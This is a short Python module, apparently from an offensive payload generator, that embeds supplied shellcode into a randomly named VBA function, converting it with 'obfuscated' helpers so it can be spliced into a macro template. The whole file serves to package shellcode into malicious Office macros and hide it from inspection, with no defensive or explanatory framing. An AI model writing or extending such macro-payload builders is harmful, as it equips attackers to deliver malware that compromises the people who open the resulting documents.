import random
import string
from utils.utils import *

class embedded:

    def __init__(self, shellcode):
        self.name = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16))
        shellcodeType = type(shellcode).__name__
        if shellcodeType == "str":
            self.type = 'String'
        elif shellcodeType == "bytes":
            self.type = f"Byte()"
        elif shellcodeType == "list":
            self.type = f"String()"
        self.shellcode = globals()[f'{type(shellcode).__name__}_to_vba'](shellcode, 'obfuscated')

    def imports(self):
        return []

    def codeblock(self):
        
        return f"""

Function {self.name}() As {self.type}
    {self.shellcode}
    
    {self.name} = obfuscated
End Function
"""

    def compilerOptions(self):
        return []

    def transformer(self, shellcodestring):
        return shellcodestring.format(shellcode=f'{self.name}()')
